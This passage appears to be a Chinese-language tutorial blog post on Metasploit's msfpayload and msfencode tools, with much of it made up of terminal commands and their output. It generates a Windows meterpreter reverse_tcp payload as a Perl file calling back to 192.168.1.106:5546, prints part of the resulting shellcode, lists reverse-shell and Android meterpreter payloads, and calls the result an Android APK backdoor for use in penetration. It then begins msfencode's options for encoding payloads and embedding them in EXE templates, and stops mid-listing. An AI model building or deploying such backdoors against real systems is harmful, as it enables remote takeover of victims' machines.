[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*
[!]&nbsp;************************************************************************</pre><pre class="brush:bash;toolbar:false">Usage:&nbsp;/usr/local/bin/msfpayload&nbsp;[]
&nbsp;[var=val]&nbsp;&lt;[S]ummary|C|Cs[H]arp|[P]erl|Rub[Y]|[R]aw|[J]s|e[X]e|[D]ll|[V]BA|[W]ar|Pytho[N]|s[O]&gt;
OPTIONS:
&nbsp;&nbsp;&nbsp;-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Help&nbsp;banner
&nbsp;&nbsp;&nbsp;&nbsp;-l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&nbsp;available&nbsp;payloads</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">msfpayload &nbsp;操作选项 payload模块 变量定义 生成的文件格式，目前支持的格式有：C代码，C＃代码，perl代码，ruby代码，Raw文件流，Js代码，exe文件，dll文件，vba文件，War文件，apk文件，python文件，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">如，我们想生成一个通过反弹tcp端口的perl文件格式的payload，那么我们执行以下操作</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;
windows/meterpreter/reverse_tcp&nbsp;LHOST=192.168.1.106&nbsp;LPORT=5546&nbsp;P&nbsp;
&gt;back.pl[!]&nbsp;
************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*
[!]&nbsp;************************************************************************</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">ok接下来我们查看该文件是否生成，文件内容是什么</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;head&nbsp;-n&nbsp;20&nbsp;back.pl
#&nbsp;windows/meterpreter/reverse_tcp&nbsp;-&nbsp;281&nbsp;bytes&nbsp;(stage&nbsp;1)
#&nbsp;http://www.metasploit.com
#&nbsp;VERBOSE=false,&nbsp;LHOST=192.168.1.106,&nbsp;LPORT=5546,
#&nbsp;ReverseConnectRetries=5,&nbsp;ReverseListenerBindPort=0,
#&nbsp;ReverseAllowProxy=false,&nbsp;ReverseListenerThreaded=false,
#&nbsp;EnableStageEncoding=false,&nbsp;StageEncoderSaveRegisters=,
#&nbsp;StageEncodingFallback=true,&nbsp;PrependMigrate=false,
#&nbsp;EXITFUNC=process,&nbsp;AutoLoadStdapi=true,
#&nbsp;InitialAutoRunScript=,&nbsp;AutoRunScript=,&nbsp;AutoSystemInfo=true,
#&nbsp;EnableUnicodeEncoding=true
my&nbsp;$buf&nbsp;=
&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;&nbsp;.
&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;&nbsp;.
&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;&nbsp;.
&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;&nbsp;.
&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;&nbsp;.
&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;&nbsp;.
&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;&nbsp;.
&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;&nbsp;.
&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;&nbsp;.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里我们可以看到在当前目录生成了back.pl，查看perl文件内容，可以看到，反弹的ip地址是192.168.1.106，反弹的端口是5546，重试的次数是5次，允许加密，下面是执行反弹的shellcode代码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这里我们只是举了一个简单的例子，同样，如果我不知道有哪些payload可以提供给我们使用，那么我们只需要执行</span></p><p></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;-l[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
Framework&nbsp;Payloads&nbsp;(356&nbsp;total)==============================
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;&nbsp;aix/ppc/shell_bind_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Listen&nbsp;for&nbsp;a&nbsp;connection&nbsp;and&nbsp;spawn&nbsp;a&nbsp;command&nbsp;shell
&nbsp;&nbsp;&nbsp;&nbsp;aix/ppc/shell_find_port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spawn&nbsp;a&nbsp;shell&nbsp;on&nbsp;an&nbsp;established&nbsp;connection
&nbsp;&nbsp;&nbsp;&nbsp;aix/ppc/shell_interact&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Simply&nbsp;execve&nbsp;/bin/sh&nbsp;(for&nbsp;inetd&nbsp;programs)
&nbsp;&nbsp;&nbsp;&nbsp;aix/ppc/shell_reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connect&nbsp;back&nbsp;to&nbsp;attacker&nbsp;and&nbsp;spawn&nbsp;a&nbsp;command&nbsp;shell
&nbsp;&nbsp;&nbsp;&nbsp;android/meterpreter/reverse_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTP
&nbsp;&nbsp;&nbsp;&nbsp;android/meterpreter/reverse_https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTPS
&nbsp;&nbsp;&nbsp;&nbsp;android/meterpreter/reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Connect&nbsp;back&nbsp;stager
&nbsp;&nbsp;&nbsp;&nbsp;android/shell/reverse_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spawn&nbsp;a&nbsp;piped&nbsp;command&nbsp;shell&nbsp;(sh).&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTP
&nbsp;&nbsp;&nbsp;&nbsp;android/shell/reverse_https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spawn&nbsp;a&nbsp;piped&nbsp;command&nbsp;shell&nbsp;(sh).&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTPS…………</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这样就会列出所有的payload</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">由于payoad类型太多，我们不知道如何选择适合自己的平台的payload，比如我们需要android平台下的payload，那么我们只需要执行以下命令</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;-l|&nbsp;grep&nbsp;android
[!]&nbsp;************************************************************************
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*
[!]&nbsp;************************************************************************

&nbsp;&nbsp;&nbsp;&nbsp;android/meterpreter/reverse_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTP

&nbsp;&nbsp;&nbsp;&nbsp;android/meterpreter/reverse_https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTPS

&nbsp;&nbsp;&nbsp;&nbsp;android/meterpreter/reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Connect&nbsp;back&nbsp;stager

&nbsp;&nbsp;&nbsp;&nbsp;android/shell/reverse_http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spawn&nbsp;a&nbsp;piped&nbsp;command&nbsp;shell&nbsp;(sh).&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTP

&nbsp;&nbsp;&nbsp;&nbsp;android/shell/reverse_https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spawn&nbsp;a&nbsp;piped&nbsp;command&nbsp;shell&nbsp;(sh).&nbsp;Tunnel&nbsp;communication&nbsp;over&nbsp;HTTPS

&nbsp;&nbsp;&nbsp;&nbsp;android/shell/reverse_tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spawn&nbsp;a&nbsp;piped&nbsp;command&nbsp;shell&nbsp;(sh).&nbsp;Connect&nbsp;back&nbsp;stager</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这样所有的android平台下的payload都可以查找出来了，再根据我们的系统平台环境和网络环境选择合适的payload。</span></p><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">有了合适的payload，但是我不知道需要设置哪些参数，那么我们就需要执行下面的参数，这样根据系统提示，我们可以进行我们下一步的操作<br/></span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfpayload&nbsp;android/meterpreter/reverse_tcp&nbsp;s[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfpayload&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
Name:&nbsp;Android&nbsp;Meterpreter,&nbsp;Dalvik&nbsp;Reverse&nbsp;TCP&nbsp;Stager
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Module:&nbsp;payload/android/meterpreter/reverse_tcp
&nbsp;&nbsp;&nbsp;Platform:&nbsp;Android
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch:&nbsp;dalvikNeeds&nbsp;Admin:&nbsp;No
&nbsp;Total&nbsp;size:&nbsp;8053
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rank:&nbsp;Normal
Provided&nbsp;by:
&nbsp;&nbsp;mihi
&nbsp;&nbsp;egypt&nbsp;
&nbsp;&nbsp;anwarelmakrahy
&nbsp;&nbsp;timwr
Basic&nbsp;options:Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------AutoLoadAndroid&nbsp;&nbsp;true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Automatically&nbsp;load&nbsp;the&nbsp;Android&nbsp;extensionLHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.189.134&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;addressLPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4444&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;listen&nbsp;portRetryCount&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Number&nbsp;of&nbsp;trials&nbsp;to&nbsp;be&nbsp;made&nbsp;if&nbsp;connection&nbsp;failed
Description:
&nbsp;&nbsp;Run&nbsp;a&nbsp;meterpreter&nbsp;server&nbsp;on&nbsp;Android.&nbsp;Connect&nbsp;back&nbsp;stager</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这样会提示我们需要设置哪些参数，如LHOST，LPORT，是否自动加载，重试连接次数，这样我们就知道下一步如何对我们的payload进行设置操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这样我们就生成了android平台的apk后门文件,由于msfpayload可以生成不同平台，不同语言的payload，所以在渗透的时候，我们可以根据目标系统的环境，和网络环境，选择我们合适的payload和生成的文件格式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">接下来，我们继续介绍metasploit的另外一个比较重要的参数msfencode的用法</span></p><pre class="brush:bash;toolbar:false">exploit@ubuntu:/pentest/framework3$&nbsp;msfencode&nbsp;-h[!]&nbsp;************************************************************************[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;utility&nbsp;msfencode&nbsp;is&nbsp;deprecated!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;be&nbsp;removed&nbsp;on&nbsp;or&nbsp;about&nbsp;2015-06-08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please&nbsp;use&nbsp;msfvenom&nbsp;instead&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*[!]&nbsp;*&nbsp;&nbsp;Details:&nbsp;https://github.com/rapid7/metasploit-framework/pull/4333&nbsp;&nbsp;&nbsp;*[!]&nbsp;************************************************************************
Usage:&nbsp;/usr/local/bin/msfencode
OPTIONS:
&nbsp;&nbsp;&nbsp;-a&nbsp;&nbsp;&nbsp;The&nbsp;architecture&nbsp;to&nbsp;encode&nbsp;as
&nbsp;&nbsp;&nbsp;&nbsp;-b&nbsp;&nbsp;&nbsp;The&nbsp;list&nbsp;of&nbsp;characters&nbsp;to&nbsp;avoid:&nbsp;&#39;\x00\xff&#39;
&nbsp;&nbsp;&nbsp;&nbsp;-c&nbsp;&nbsp;&nbsp;The&nbsp;number&nbsp;of&nbsp;times&nbsp;to&nbsp;encode&nbsp;the&nbsp;data
&nbsp;&nbsp;&nbsp;&nbsp;-d&nbsp;&nbsp;&nbsp;Specify&nbsp;the&nbsp;directory&nbsp;in&nbsp;which&nbsp;to&nbsp;look&nbsp;for&nbsp;EXE&nbsp;templates
&nbsp;&nbsp;&nbsp;&nbsp;-e&nbsp;&nbsp;&nbsp;The&nbsp;encoder&nbsp;to&nbsp;use
&nbsp;&nbsp;&nbsp;&nbsp;-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Help&nbsp;banner
&nbsp;&nbsp;&nbsp;&nbsp;-i&nbsp;&nbsp;&nbsp;Encode&nbsp;the&nbsp;contents&nbsp;of&nbsp;the&nbsp;supplied&nbsp;file&nbsp;path
&nbsp;&nbsp;&nbsp;&nbsp;-k&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keep&nbsp;template&nbsp;working;&nbsp;run&nbsp;payload&nbsp;in&nbsp;new&nbsp;thread&nbsp;(use&nbsp;with&nbsp;-x)
&nbsp;&nbsp;&nbsp;&nbsp;-l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&nbsp;available&nbsp;encoders
